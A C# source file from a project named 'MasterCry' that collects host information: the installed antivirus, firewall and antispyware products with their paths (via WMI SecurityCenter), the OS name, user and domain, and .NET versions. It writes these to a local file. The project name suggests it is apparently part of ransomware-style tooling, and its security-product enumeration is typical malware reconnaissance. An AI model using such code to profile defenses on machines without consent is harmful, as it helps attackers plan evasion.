
/****************************** ghost1372.github.io ******************************\
*	Module Name:	System_Details.cs
*	Project:		MasterCry
*	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
*	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
*
*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 21, 02:45 ب.ظ
*	
***********************************************************************************/

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Management;
using System.Text;

namespace MasterCry
{
    class System_Details
    {
        private static void getAntivirus()
        {
            var antiVirusPreVista = new ManagementObjectSearcher(string.Format(@"\\{0}\root\SecurityCenter", Environment.MachineName), "SELECT * FROM AntivirusProduct");
            var antiVirusPostVista = new ManagementObjectSearcher(string.Format(@"\\{0}\root\SecurityCenter2", Environment.MachineName), "SELECT * FROM AntivirusProduct");

            var fireWallPreVista = new ManagementObjectSearcher(string.Format(@"\\{0}\root\SecurityCenter", Environment.MachineName), "SELECT * FROM FirewallProduct");
            var fireWallPostVista = new ManagementObjectSearcher(string.Format(@"\\{0}\root\SecurityCenter2", Environment.MachineName), "SELECT * FROM FirewallProduct");

            var antiSpywarePreVista = new ManagementObjectSearcher(string.Format(@"\\{0}\root\SecurityCenter", Environment.MachineName), "SELECT * FROM AntiSpywareProduct");
            var antiSpywarePostVista = new ManagementObjectSearcher(string.Format(@"\\{0}\root\SecurityCenter2", Environment.MachineName), "SELECT * FROM AntiSpywareProduct");

            var antiVirusPreResult = antiVirusPreVista.Get().OfType<ManagementObject>();
            var antiVirusPostResult = antiVirusPostVista.Get().OfType<ManagementObject>();

            var fireWallPreResult = fireWallPreVista.Get().OfType<ManagementObject>();
            var fireWallPostResult = fireWallPostVista.Get().OfType<ManagementObject>();

            var antiSpywarePreResult = antiSpywarePreVista.Get().OfType<ManagementObject>();
            var antiSpywarePostResult = antiSpywarePostVista.Get().OfType<ManagementObject>();

            var antiVirus_Instances = antiVirusPreResult.Concat(antiVirusPostResult);

            var fireWall_Instances = fireWallPreResult.Concat(fireWallPostResult);

            var antiSpyware_Instances = antiSpywarePreResult.Concat(antiSpywarePostResult);

            var installedAntivirusses = antiVirus_Instances
                .Select(i => i.Properties.OfType<PropertyData>())
                .Where(pd => pd.Any(p => p.Name == "displayName") && pd.Any(p => p.Name == "pathToSignedProductExe"))
                .Select(pd => new
                {
                    Name = pd.Single(p => p.Name == "displayName").Value,
                    Path = pd.Single(p => p.Name == "pathToSignedProductExe").Value
                })
                .ToArray();

            var installedFireWall = fireWall_Instances
                .Select(i => i.Properties.OfType<PropertyData>())
                .Where(pd => pd.Any(p => p.Name == "displayName") && pd.Any(p => p.Name == "pathToSignedProductExe"))
                .Select(pd => new
                {
                    Name = pd.Single(p => p.Name == "displayName").Value,
                    Path = pd.Single(p => p.Name == "pathToSignedProductExe").Value
                })
                .ToArray();

            var installedAntiSpyware = antiSpyware_Instances
                .Select(i => i.Properties.OfType<PropertyData>())
                .Where(pd => pd.Any(p => p.Name == "displayName") && pd.Any(p => p.Name == "pathToSignedProductExe"))
                .Select(pd => new
                {
                    Name = pd.Single(p => p.Name == "displayName").Value,
                    Path = pd.Single(p => p.Name == "pathToSignedProductExe").Value
                })
                .ToArray();

            foreach (var antiVirus in installedAntivirusses)
            {
                WriteText("AntiVirus: " + antiVirus.Name + "\t Path: " + antiVirus.Path);
            }

            foreach (var antiVirus in installedFireWall)
            {
                WriteText("FireWall: " + antiVirus.Name + "\t Path: " + antiVirus.Path);
            }

            foreach (var antiVirus in installedAntiSpyware)
            {
                WriteText("AntiSpyWare: " + antiVirus.Name + "\t Path: " + antiVirus.Path);
            }
        }
        public static void getOperatingSystemInfo()
        {
            WriteText("OS Friendly Name: " + FriendlyName());
            WriteText("OS UserName: " + Environment.UserName);
            WriteText("OS User Domain Name: " + Environment.UserDomainName);
            WriteText("OS Version: " + Environment.OSVersion);
            WriteText("OS Is 64Bit: " + Environment.Is64BitOperatingSystem);

            getAntivirus();
            GetDotnetVersionFromRegistry();
            Get45or451FromRegistry();
        }
        private static string FriendlyName()
        {
            string ProductName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
            string CSDVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
            if (ProductName != "")
            {
                return (ProductName.StartsWith("Microsoft") ? "" : "Microsoft ") + ProductName +
                            (CSDVersion != "" ? " " + CSDVersion : "");
            }
            return "";
        }
        private static string HKLM_GetString(string path, string key)
        {
            try
            {
                RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
                if (rk == null) return "";
                return (string)rk.GetValue(key);
            }
            catch { return ""; }
        }
        private static void GetDotnetVersionFromRegistry()
        {
            // Opens the registry key for the .NET Framework entry. 
            using (RegistryKey ndpKey =
                RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, "").
                OpenSubKey(@"SOFTWARE\Microsoft\NET Framework Setup\NDP\"))
            {
                foreach (string versionKeyName in ndpKey.GetSubKeyNames())
                {
                    if (versionKeyName.StartsWith("v"))
                    {

                        RegistryKey versionKey = ndpKey.OpenSubKey(versionKeyName);
                        string name = (string)versionKey.GetValue("Version", "");
                        string sp = versionKey.GetValue("SP", "").ToString();
                        string install = versionKey.GetValue("Install", "").ToString();
                        if (install == "") //no install info, must be later.
                            WriteText("DotNetFramwok Version: " + versionKeyName + "\t" + name);

                        else
                        {
                            if (sp != "" && install == "1")
                                 WriteText("DotNetFramwok Version: " + versionKeyName + "\t" + name + " SP" + sp);

                        }
                        if (name != "")
                            continue;

                        foreach (string subKeyName in versionKey.GetSubKeyNames())
                        {
                            RegistryKey subKey = versionKey.OpenSubKey(subKeyName);
                            name = (string)subKey.GetValue("Version", "");
                            if (name != "")
                                sp = subKey.GetValue("SP", "").ToString();
                            install = subKey.GetValue("Install", "").ToString();
                            if (install == "") //no install info, must be later.
                                WriteText("DotNetFramwok Version: " + versionKeyName + "\t" + name);
                            else
                            {
                                if (sp != "" && install == "1")
                                    WriteText("DotNetFramwok Version: " + subKeyName + "\t" + name + " SP" + sp);
                                else if (install == "1")
                                    WriteText("DotNetFramwok Version: " + subKeyName + "\t" + name);

                            }

                        }

                    }
                }
            }
        }
        private static string CheckFor45DotVersion(int releaseKey)
        {
            if (releaseKey >= 393295)
            {
                return "4.6 or later";
            }
            if ((releaseKey >= 379893))
            {
                return "4.5.2 or later";
            }
            if ((releaseKey >= 378675))
            {
                return "4.5.1 or later";
            }
            if ((releaseKey >= 378389))
            {
                return "4.5 or later";
            }
            // This line should never execute. A non-null release key should mean
            // that 4.5 or later is installed.
            return "No 4.5 or later version detected";
        }
        private static void Get45or451FromRegistry()
        {
            using (RegistryKey ndpKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
            {
                if (ndpKey != null && ndpKey.GetValue("Release") != null)
                    WriteText("DotNetFramwok Version: " + CheckFor45DotVersion((int)ndpKey.GetValue("Release")));
                else
                    WriteText("DotNetFramwok Version: Version 4.5 or later is not detected.");
            }
        }

        public static string ReadSetting(string key)
        {
            string result = string.Empty;
            try
            {
                var appSettings = ConfigurationManager.AppSettings;
                result = appSettings[key] ?? "0";
            }
            catch (ConfigurationErrorsException)
            {
                result = "Error reading app settings";
            }
            return result;
        }

        //Add or Update Application Settings to Config File
        public static void AddUpdateAppSettings(string key, string value)
        {
            try
            {
                var configFile = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
                var settings = configFile.AppSettings.Settings;
                if (settings[key] == null)
                {
                    settings.Add(key, value);
                }
                else
                {
                    settings[key].Value = value;
                }
                configFile.Save(ConfigurationSaveMode.Modified);
                ConfigurationManager.RefreshSection(configFile.AppSettings.SectionInformation.Name);
            }
            catch (ConfigurationErrorsException)
            {
                Console.WriteLine("Error writing app settings");
            }
        }
        private static void WriteText(string Text)
        {
            using (System.IO.StreamWriter file =
            new System.IO.StreamWriter(BuildVars.Save_Location, true))
            {
                file.WriteLine(Text);
            }
        }
    }
}
